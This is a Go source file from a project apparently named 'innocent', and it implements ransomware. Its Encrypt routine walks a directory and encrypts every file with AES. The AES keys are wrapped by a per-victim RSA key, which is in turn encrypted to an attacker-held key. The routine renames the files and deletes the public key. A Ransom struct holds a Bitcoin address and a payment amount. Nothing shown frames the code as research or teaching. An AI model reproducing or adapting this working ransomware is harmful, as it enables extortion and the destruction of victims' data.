package rs

import (
	"bytes"
	"crypto/rsa"
	"errors"
	"fmt"
	iofs "io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/smile10/innocent/crypto"
	"github.com/smile10/innocent/fs"
)

type Ransom struct {
	PublicKey      string
	BitcoinAddress string
	Amount         float64
}

func LoadPublicKey(path string) (*rsa.PublicKey, error) {
	pubStr, err := fs.ReadStringFileContent(path)
	if err != nil {
		return nil, err
	}

	publicKey, err := crypto.ImportRSAPublicKeyFromPem(pubStr)
	if err != nil {
		return nil, err
	}

	return publicKey, nil
}

func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
	rsaPrivateString, err := fs.ReadStringFileContent(path)

	if err != nil {
		return nil, err
	}

	rsaPrivate, err := crypto.ImportRSAPrivateKeyFromPem(rsaPrivateString)

	if err != nil {
		return nil, err
	}

	return rsaPrivate, nil
}

func Encrypt(publicKeyPath, path, encSuffix string, extBlacklist, extWhitelist []string, skipHidden bool) error {
	if path == "" {
		return errors.New("path is required")
	}

	publicKey, err := LoadPublicKey(publicKeyPath)
	if err != nil {
		return err
	}

	log.Println("RSA public key loaded")

	keyPair, err := crypto.NewRandomRSAKeyPair(4096)
	if err != nil {
		return err
	}

	vPubKey := keyPair.PublicKey
	vPrivKey := keyPair.PrivateKey

	vPrivKeyPem := crypto.ExportRSAPrivateKeyToPem(vPrivKey)
	evPrivKey, err := crypto.RSAEncrypt([]byte(vPrivKeyPem), publicKey)
	if err != nil {
		fmt.Println(err)
		return err
	}

	err = os.WriteFile("encryptedKey", evPrivKey, 0644)
	if err != nil {
		return err
	}

	fs.SafeDeleteFileIfExists(publicKeyPath)

	publicKey = nil
	keyPair = &crypto.RSAKeyPair{}
	vPrivKey = nil

	absolutePath, err := filepath.Abs(path)

	err = fs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
		aesKey, err := crypto.NewRandomAESKey(32)
		if err != nil {
			return err
		}

		encryptedAesKey, err := crypto.RSAEncrypt(aesKey, vPubKey)
		if err != nil {
			return err
		}

		err = encryptFile(path, aesKey, encryptedAesKey, encSuffix)
		if err != nil {
			return err
		}

		return nil
	})

	return nil
}

func Decrypt(privateKeyPath, path, encSuffix string, extBlacklist, extWhitelist []string, skipHidden bool) error {
	if path == "" {
		return errors.New("path is required")
	}

	if privateKeyPath == "" {
		return errors.New("public key is required")
	}

	rsaPrivateKey, err := LoadPrivateKey(privateKeyPath)
	if err != nil {
		return err
	}

	log.Println("RSA private key loaded")

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)

	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
		err := decryptFile(path, rsaPrivateKey, encSuffix)

		if err != nil {
			return err
		}

		return nil
	})

	return err
}

func encryptFile(path string, aesKey crypto.AESKey, encryptedAesKey []byte, encSuffix string) error {
	log.Printf("Encrypting %s", path)
	newFilePath := fmt.Sprintf("%s%s", path, encSuffix)

	plainText, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	cipherText, err := crypto.AESEncrypt(plainText, aesKey)
	if err != nil {
		return err
	}

	err = os.Rename(path, newFilePath)
	if err != nil {
		return err
	}

	fileContent := append(cipherText, encryptedAesKey...)
	return fs.WriteStringToFile(newFilePath, string(fileContent))
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
	log.Printf("Decrypting %s", path)

	cipherText, err := os.ReadFile(path)

	newFilePath := strings.Replace(path, encSuffix, "", 1)
	if err != nil {
		return err
	}

	byteReader := bytes.NewReader(cipherText)
	encryptedAesKey := make([]byte, 512)

	_, err = byteReader.ReadAt(encryptedAesKey, int64(len(cipherText)-rsaPrivateKey.Size()))
	if err != nil {
		return err
	}

	aesKey, err := crypto.RSADecrypt(encryptedAesKey, rsaPrivateKey)
	if err != nil {
		return err
	}

	plainText, err := crypto.AESDecyrpt(cipherText[:len(cipherText)-rsaPrivateKey.Size()], aesKey)
	if err != nil {
		fmt.Println(err)
		return err
	}

	return fs.WriteToFile(newFilePath, plainText)
}
